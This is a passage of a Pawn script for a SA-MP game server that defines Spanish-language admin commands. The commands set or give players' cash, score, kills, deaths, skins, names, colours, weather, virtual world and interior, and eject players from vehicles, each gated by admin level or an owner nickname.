	    new tmp[128], tmp2[128], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveCash [JugadorID] [Cantidad]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/GiveCash");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {52C433}$%d{EAEAEA} a {0080FF}%s.", cash, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {52C433}$%d.", pName(playerid), cash); SendClientMessage(player1,red,string); }
   			return GivePlayerMoney(player1, cash);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:setcash(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetCash [JugadorID] [Cantidad]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetCash");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {52C433}$%d{FFFFFF} a {0080FF}%s.", cash, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {52C433}$%d.", pName(playerid), cash); SendClientMessage(player1,red,string); }
			ResetPlayerMoney(player1);
   			return GivePlayerMoney(player1, cash);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:setcashrcon(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
	if(IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetCashRcon [JugadorID] [Cantidad]");
		new player1 = strval(tmp), cash = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetCash");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {52C433}$%d{FFFFFF} a {0080FF}%s.", cash, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {52C433}$%d.", pName(playerid), cash); SendClientMessage(player1,red,string); }
			ResetPlayerMoney(player1);
   			return GivePlayerMoney(player1, cash);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel RCON{EAEAEA} para usar este comando.");
}

CMD:setscore(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetScore [JugadorID] [Score]");
		new player1 = strval(tmp), score = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetScore");
			//PlayerInfo[player1][Kills] = score;
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has puesto el score a {0080FF}%s{EAEAEA} en {FF0000}%d.", pName(player1), score); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha puesto el score en {FF0000}%d.", pName(playerid), score); SendClientMessage(player1,red,string); }
   			return  SetPlayerScore(player1, score);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:givescore(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveScore [JugadorID] [Score]");
		new player1 = strval(tmp), score = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/GiveScore");
			#if defined USE_STATS
		 	PlayerInfo[player1][Kills] = PlayerInfo[player1][Kills]+ score;
	    	#endif
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {FF0000}%d{EAEAEA} de score a {0080FF}%s.", score, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {FF0000}%d{EAEAEA} de score.", pName(playerid), score); SendClientMessage(player1,red,string); }
   			return  SetPlayerScore(player1, GetPlayerScore(player1)+ score);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:setskin(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetSkin [JugadorID] [SkinID]");
		new player1 = strval(tmp), skin = strval(tmp2), string[128];
		if(!IsValidSkin(skin)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID de skin invalida");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetSkin");
			format(string, sizeof(string), "|Info| »{FFFFFF} Le has cambiado el skin a {0080FF}%s{EAEAEA} por el skin {FF0000}%d.", pName(player1), skin); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado de skin al skin {FF0000}%d.", pName(playerid), skin); SendClientMessage(player1,red,string); }
   			return SetPlayerSkin(player1, skin);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

CMD:setname(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetName [Jugador] [Nuevo Nombre]");
		new player1 = strval(tmp), length = strlen(tmp2), string[128];
		if(length < 3 || length > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Numero de caracteres incorrecto.");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetName");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has cambiado el nombre a {0080FF}%s{EAEAEA} por el nombre {FF0000}%s.", pName(player1), tmp2); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado el nombre a {FF0000}%s.", pName(playerid), tmp2); SendClientMessage(player1,red,string); }
			SetPlayerName(player1, tmp2);
   			return OnPlayerConnect(player1);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

/*CMD:nombre(playerid,params[]) {
	new Score; Score=GetPlayerScore(playerid);
	if(Score>100)
	{
		if(PlayerInfo[playerid][LoggedIn] == 1)
		{
			new string[128];
			if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{FFFFFF} /Nombre [NuevoNombre]"),SendClientMessage(playerid, red, "|Info| »{FFFFFF} Perderas tu casa, tu negocio y tus vehiculos al cambiar de nombre.");
			if (strlen(params) < 3 || strlen(params) > 20) return SendClientMessage(playerid,red,"|Error| »{FFFFFF} El nombre debe ser mayor a 3 digitos.");
			new PlayerName[MAX_PLAYER_NAME];
			//if(isnull("Hacker",params,true) || !strcmp("aux",params,true) || !strcmp("Admin",params,true) || !strcmp("prn",params,true) || !strcmp("lptn",params,true) || !strcmp("nul",params,true) || !strcmp("Anonymous",params,true) || !strcmp("clock$",params,true)) return SendClientMessage(playerid,red,"|Error| »{FFFFFF} No puedes ponerte este nombre.");
			if(udb_Exists(params)) return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Ese nombre ya existe.");
			GetPlayerName(playerid, PlayerName, sizeof(PlayerName));
			format(string,sizeof(string),"|Info| »{0080FF} %s {FFFFFF}se ha cambiado el nombre a {0080FF}%s.",PlayerName,params);
			SendClientMessageToAll(red,string);
			SaveToFile("NickLog",string);
			aresetpall(playerid);
			udb_RenameUser(PlayerName, params);
			format(string,sizeof(string),"{FFFFFF}Recuerda que la siguiente vez que jueges debes\nIniciar con el nick {0080FF}%s",params);
			ShowPlayerDialog(playerid,78,DIALOG_STYLE_MSGBOX,"{FF0000}NUEVO NOMBRE",string,"Aceptar","");
			SetPlayerName(playerid, params);
		} else return SendClientMessage(playerid,red,"|Error| »{FFFFFF} Debes estar registrado para usar este comandos.");
	} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Debes tener mas de 100 score para cambiarte de nombre.");
	return 1;
}*/

CMD:setcolour(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) {
			SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetColour [JugadorID] [Color]");
			return SendClientMessage(playerid, red, "|Colores| »{EAEAEA} [0=Negro |1=Blanco |2=Rojo |3=Naranja |4=Amarillo |5=Verde |6=Azul |7=Purpura |8=Marron |9=Rosa]");
		}
		new player1 = strval(tmp), Colour = strval(tmp2), string[128], colour[24];
		if(Colour > 9) return SendClientMessage(playerid, red, "|Colores| »{EAEAEA} [0=Negro |1=Blanco |2=Rojo |3=Naranja |4=Amarillo |5=Verde |6=Azul |7=Purpura |8=Marron |9=Rosa]");
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
	        CMDMessageToAdmins(playerid,"/SetColour");
			switch (Colour)
			{
			    case 0: { SetPlayerColor(player1,black); colour = "Negro"; }
			    case 1: { SetPlayerColor(player1,COLOR_WHITE); colour = "Blanco"; }
			    case 2: { SetPlayerColor(player1,red); colour = "Red"; }
			    case 3: { SetPlayerColor(player1,orange); colour = "Naranja"; }
				case 4: { SetPlayerColor(player1,orange); colour = "Amarillo"; }
				case 5: { SetPlayerColor(player1,COLOR_GREEN1); colour = "Verde"; }
				case 6: { SetPlayerColor(player1,COLOR_BLUE); colour = "Azul"; }
				case 7: { SetPlayerColor(player1,COLOR_PURPLE); colour = "Purpura"; }
				case 8: { SetPlayerColor(player1,COLOR_BROWN); colour = "Marron"; }
				case 9: { SetPlayerColor(player1,COLOR_PINK); colour = "Rosa"; }
			}
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado el color de tu nick a %s.", pName(playerid), colour); SendClientMessage(player1,red,string); }
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has cambiado el color del nick a {0080FF}%s{EAEAEA} por el color %s.", pName(player1), colour);
   			return SendClientMessage(playerid,red,string);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

CMD:setweather(playerid,params[]) {
	if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetWeather [JugadorID] [ID del Clima]");
		new player1 = strval(tmp), weather = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetWeather");
			format(string, sizeof(string), "|Info| »{EAEAEA}Le has cambiado el clima a {0080FF}%s{EAEAEA} por el clima {FF0000}%d.", pName(player1), weather); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado el clima a {FF0000}%d.", pName(playerid), weather); SendClientMessage(player1,red,string); }
			SetPlayerWeather(player1,weather); PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

CMD:setkills(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetKills [JugadorID] [Kills]");
		new player1 = strval(tmp), kills = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
		if(PlayerInfo[player1][LoggedIn] == 0) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetKills");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has puesto los kills de {0080FF}%s{EAEAEA} en {FF0000}%d.", pName(player1), kills); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha puesto tus kills en {FF0000}%d.", pName(playerid), kills); SendClientMessage(player1,red,string); }
		 	SavePlayer(player1);
		 	#if defined USE_STATS
			PlayerInfo[player1][Kills] = kills;
	    	#endif
		 	return 1;
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicolo{EAEAEA} puede usar este comando.");
}

CMD:givekills(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveKills [JugadorID] [Kills]");
		new player1 = strval(tmp), kills = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"{ff0000}<ERROR>{ffffff} No puedes usar este comando sobre un admin");
		if(PlayerInfo[player1][LoggedIn] == 0) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/GiveKills");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {FF0000}%d{EAEAEA} kills a {0080FF}%s.", kills, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {FF0000}%d{EAEAEA} kills.", pName(playerid), kills); SendClientMessage(player1,red,string); }
		 	SavePlayer(player1);
		 	#if defined USE_STATS
		 	PlayerInfo[player1][Kills] = PlayerInfo[player1][Kills]+ kills;
	    	#endif
		 	return 1;
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:setdeaths(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetDeaths [JugadorID] [Deaths]");
		new player1 = strval(tmp), deaths = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"{ff0000}<ERROR>{ffffff} No puedes usar este comando sobre un admin");
		if(PlayerInfo[player1][LoggedIn] == 0) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta registrado.");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetDeaths");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has puesto las deaths de {0080FF}%s{EAEAEA} en {FF0000}%d}.", pName(player1), deaths); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha puesto tus deaths en {FF0000}%d.", pName(playerid), deaths); SendClientMessage(player1,red,string); }
		 	SavePlayer(player1);
		 	#if defined USE_STATS
		 	PlayerInfo[player1][Deaths] = deaths;
	    	#endif
		 	return 1;
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:givedeaths(playerid,params[]) {
    new pame[MAX_PLAYER_NAME];
	GetPlayerName(playerid, pame, sizeof(pame));
    if(!strcmp(NickPrincipal,pame,true)){
	if(PlayerInfo[playerid][Level] >= 6 || IsPlayerAdmin(playerid)) {
        new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /GiveDeaths [JugadorID] [Deaths]");
		new player1 = strval(tmp), deaths = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"{ff0000}<ERROR>{ffffff} No puedes usar este comando sobre un admin");
		if(PlayerInfo[player1][LoggedIn] == 0) return SendClientMessage(playerid,red,"|Error| »{FFFFFF} El jugador no esta registrado.");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/GiveDeaths");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has dado {FF0000}%d{EAEAEA} deaths a {0080FF}%s.", deaths, pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha dado {FF0000}%d{EAEAEA} deaths.", pName(playerid), deaths); SendClientMessage(player1,red,string); }
		 	SavePlayer(player1);
		 	#if defined USE_STATS
		 	PlayerInfo[player1][Deaths] = PlayerInfo[player1][Deaths]+ deaths;
	    	#endif
		 	return 1;
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 6{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Solo {C0C0C0}Psicoloco{EAEAEA} puede usar este comando.");
}

CMD:setworld(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 5 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetWorld [JugadorID] [Mundo virtual]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetWorld");
			format(string, sizeof(string), "|Info| »{FFFFFF}Le has cambiado el mundo virtual a {0080FF}%s{FFFFFF} por {FF0000}%d.", pName(player1), time); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado tu mundo virtual a {FF0000}%d.", pName(playerid), time); SendClientMessage(player1,red,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerVirtualWorld(player1, time);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 5{EAEAEA} para usar este comando.");
}

CMD:setinterior(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    new tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2) || !IsNumeric(tmp2)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /SetInterior [JugadorID] [Interior]");
		new player1 = strval(tmp), time = strval(tmp2), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SetInterior");
			format(string, sizeof(string), "|Info| »{EAEAEA}Le has cambiado el interior a {0080FF}%s{EAEAEA} por {FF0000}%d.", pName(player1), time); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha cambiado tu interior a {FF0000}%d.", pName(playerid), time); SendClientMessage(player1,red,string); }
			PlayerPlaySound(player1,1057,0.0,0.0,0.0);
   			return SetPlayerInterior(player1, time);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

CMD:eject(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Eject [JugadorID]");
		new player1 = strval(params), string[128], Float:x, Float:y, Float:z;
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			if(IsPlayerInAnyVehicle(player1)) {
		       	CMDMessageToAdmins(playerid,"/Eject");
				if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha sacado de tu vehiculo.", pName(playerid) ); SendClientMessage(player1,red,string); }
				format(string,sizeof(string),"|Info| »{EAEAEA} Has sacado a {0080FF}%s{EAEAEA} de su vehiculo.", pName(player1)); SendClientMessage(playerid,red,string);
    		   	GetPlayerPos(player1,x,y,z);
				return SetPlayerPos(player1,x,y,z+3);
			} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no esta en un vehiculo.");
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}

